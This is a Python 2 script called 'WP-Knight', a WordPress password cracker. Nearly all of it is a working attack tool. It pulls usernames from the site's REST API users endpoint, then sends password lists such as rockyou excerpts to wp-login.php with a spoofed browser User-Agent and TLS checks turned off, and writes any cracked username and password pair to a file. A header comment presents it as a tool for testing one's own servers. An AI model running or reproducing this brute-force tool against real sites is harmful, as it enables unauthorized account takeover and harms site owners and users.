
# WordPress Cracker 6/19/2018
# Coded by LogicPy

# Intended for personal security testing. Please do not use on servers you don't own.
# WP-Knight was created as a mini alternative to WPScan.

# (6/19/2018) - Basic cracker function complete. Works perfectly on any WordPress target. New features will be added soon.

# (11/8/2018) - SSL authentication glitch fixed.

# (11/9/2018) - Username enumeration/gathering feature added.

# TO-DO: Add threading capability

import json
import sys
import requests
from tqdm import tqdm

print """
	                   _.--.    .--._
	                 ."  ."      ".  ".
	                ;  ."    /\    ".  ;
	                ;  '._,-/  \-,_.`  ;
	                \  ,`  / /\ \  `,  /
	                 \/    \/  \/    \/
	                 ,=_    \/\/    _=,
	                 |  "_   \/   _"  |
	                 |_   '"-..-"'   _|
	                 | "-.        .-" |
	                 |    "\    /"    |
	                 |      |  |      |
	         ___     |      |  |      |     ___
	     _,-",  ",   '_     |  |     _'   ,"  ,"-,_
	   _(  \  \   \ =--"-.  |  |  .-"--="/   /  /  )_
	 ,"  \  \  \   \      "-'--'-"      /   /  /  /  ".
	!     \  \  \   \                  /   /  /  /     !
	:      \  \  \   \                /   /  /  /      ;
	 _  _  _ ______       _     _       _       _          
	(_)(_)(_|_____ \     (_)   | |     (_)     | |     _   
	 _  _  _ _____) )____ _____| |____  _  ____| |__ _| |_ 
	| || || |  ____(_____)  _   _)  _ \| |/ _  |  _ (_   _)
	| || || | |          | |  \ \| | | | ( (_| | | | || |_ 
	 \_____/|_|          |_|   \_)_| |_|_|\___ |_| |_| \__)
	                                     (_____|           
	Coded by LogicPy - (WordPress Cracker) - [2.0.2 - 4.9.8]

"""

# Detecting incorrect password
keyword = "incorrect"
# Detecting invalid username
keyword2 = "Invalid"
# Detecting empty field
keyword3 = "empty"

debug_Mode = False
login_URL = None
uname = None
pwd = None
saveInt = 0
listSel = 0

def console():
	while(True):
		cmd = raw_input(" Command > ")
		if cmd == "help" or cmd == "?":
			print """\n [i] Commands:\n
	url - Specify target URL ( http://website.com/wp-login.php )
	version - Check WordPress version ( Specify target URL first )
	enumerate - Gather Usernames
	list - Use Default List
	go - Activate WP-Knight
	exit - Exit WP-Knight
			"""
		elif cmd == "exit":
			sys.exit()
		elif cmd == "go":
			if login_URL == None:
				print "\n Please specify URL \n"
			else:		
				print "\n [+] WP-Knight Activated! \n"
				bruteforce()
		elif cmd == "enumerate":
			wpGet = raw_input("\n Enter URL ( http://website.com/ ) > ")
			enumerate(wpGet)
		elif cmd == "list":
			list_config()
		elif cmd == "url":
			url_config()
		elif cmd == "version":
			if login_URL == None:
				print "\n Please specify URL \n"
			else:
				versionCheck()
		else:
			print "\n [!] Invalid Command \n"

def find_between( s, first, last ):
    try:
        start = s.index( first ) + len( first )
        end = s.index( last, start )
        return s[start:end]
    except ValueError:
        return ""

def list_config():
	global listSel

	print """\n [i] Select List:\n
	1) best110 (110 passwords)
	2) 500 worst passwords (500 passwords)
	3) best 1050 (1050 passwords)
	4) rockyou-10 (92 passwords)
	5) rockyou-15 (249 passwords)
	6) twitter-banned (370 passwords)
	7) battle (4958 passwords)
	8) battle 2 (31976 passwords)
	9) battle 3 (100000 passwords)
	10) battle 4 (1000000 passwords)
	"""
	listSel = raw_input(" Select List > ")

	if listSel == '1':
		print "\n [i] best110 Selected! \n"
	elif listSel == '2':
		print "\n [i] 500 worst passwords Selected! \n"
	elif listSel == '3':
		print "\n [i] best 1050 Selected! \n"
	elif listSel == '4':
		print "\n [i] rockyou-10 Selected! \n"
	elif listSel == '5':
		print "\n [i] rockyou-15 Selected! \n"
	elif listSel == '6':
		print "\n [i] twitter-banned Selected! \n"
	elif listSel == '7':
		print "\n [i] battle Selected! \n"
	elif listSel == '8':
		print "\n [i] battle 2 Selected! \n"
	elif listSel == '9':
		print "\n [i] battle 3 Selected! \n"
	elif listSel == '10':
		print "\n [i] battle 4 Selected! \n"
	else:
		print "\n [!] Invalid Selection \n"

def url_config():
	global login_URL
	global host

	login_URL = raw_input("\n Enter target URL > ")
	print "\n [i] Target: %s\n" % (login_URL)

def versionCheck():
	global login_URL
	headers = {'Accept-Encoding': 'identity'}
	r = requests.get(login_URL, headers='')
	a = find_between(r.text,"ver=","'")
	print "\n [+] WordPress version: %s\n" % (a)

def grab_json(base_url):
    try:
        url = base_url + "/wp-json/wp/v2/users"
        r = requests.get(url, verify=False)
    except Exception:
        return False
    try:
        if "description" in r.text:
            return r.text
        else:
            return False
    except Exception:
        return False

def extract_users(the_json):
    try:
        var_json = json.loads(the_json)
    except Exception, e:
        print "\n [!] JSON Error \n"
    try:
        print "\n [+] Found %d users" %(len(var_json))
        for x in range(0, len(var_json)):
            user_id = var_json[x]['id']
            full_name = var_json[x]['name']
            user_name = var_json[x]['slug']
            print " [>] User ID: %s, Name: %s, Username: %s" %(user_id, full_name, user_name)
    except Exception:
        print "\n [!] Username enumeration failed \n"

def enumerate(wpURL):
    json = grab_json(base_url=wpURL)
    if json != False:
        extract_users(the_json=json)
    print ""

# Automatic save upon cracked
def crack_save(uname,pwd):
	try:
		file = open('cracked.txt', 'w')
		file.write("Previous Cracked Password (%s:%s)" % (uname, pwd))
		file.close()
	except:
		print "\n [!] Save Error \n"

# Automatic save during attack
def cycle_save(uname,pwd):
	try:
		file = open('saved.txt', 'w')
		file.write("Your Last Cycle Position (%s:%s)" % (uname, pwd))
		file.close()
	except:
		print "\n [!] Save Error \n"

def bruteforce():
	global aPlace
	global bPlace
	global keyword
	global host
	global login_URL
	global listSel

	# Load Username List
	text_file = open("list.txt", "r")

	# Load Password List
	if listSel == 0:
		text_file2 = open("pw.txt", "r")
	elif listSel == '1':
		text_file2 = open("lists/best110.txt", "r")
	elif listSel == '2':
		text_file2 = open("lists/500-worst-passwords.txt", "r")
	elif listSel == '3':
		text_file2 = open("lists/best1050.txt", "r")
	elif listSel == '4':
		text_file2 = open("lists/rockyou-10.txt", "r")
	elif listSel == '5':
		text_file2 = open("lists/rockyou-15.txt", "r")
	elif listSel == '6':
		text_file2 = open("lists/twitter-banned.txt", "r")
	elif listSel == '7':
		text_file2 = open("lists/battle.txt", "r")
	elif listSel == '8':
		text_file2 = open("lists/battle2.txt", "r")
	elif listSel == '9':
		text_file2 = open("lists/battle3.txt", "r")
	elif listSel == '10':
		text_file2 = open("lists/battle4.txt", "r")

	saveInt = 0

	with requests.Session() as c:
	
		# Username List 
		USERNAME = text_file.read().split('\n')
		# Password List
		PASSWORD = text_file2.read().split('\n')

		# Calculate total number of cycles
		totalCalc = (int(len(PASSWORD)) * int(len(USERNAME)))

		# Configure progress bar with total value
		progressBar = tqdm(total=totalCalc)

		# Username cycle
		for u in USERNAME:

			# Password cycle
			for p in PASSWORD:
				# Print process
				uname = u
				pwd = p
				progressBar.update(1)
				saveInt = saveInt + 1

				try:

					# 1) Direct to login url. Prepare for POST login
					c.get(login_URL)

					#POST Login data
					login_data = \
					{
						'log': uname,
						'pwd': pwd,
						'wp-submit': 'Log In',
						'testcookie': '1'
					}

					#Header data
					header_data = {
						'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20100101 Firefox/29.0'
					}

					# 2) Submit POST data. Initialize login
					r = c.post(login_URL, data=login_data, headers=header_data, verify=False)

					cookie = str(r.cookies)

					if debug_Mode == True:
						print "\n %s \n" % (cookie)

					if cookie.find('settings')>-1 or cookie.find('=' + uname)>-1:
						progressBar.close()
						print "\n Cracked [ %s : %s ] \n" % (u,p)
						crack_save(u,p)
						break
				except:
					print "\n [!] Connection Error \n"

				# Save your position every 500 cycles
				if saveInt % 500 == 0:
					cycle_save(u,p)

		text_file.close()
		text_file2.close()

		console()

console()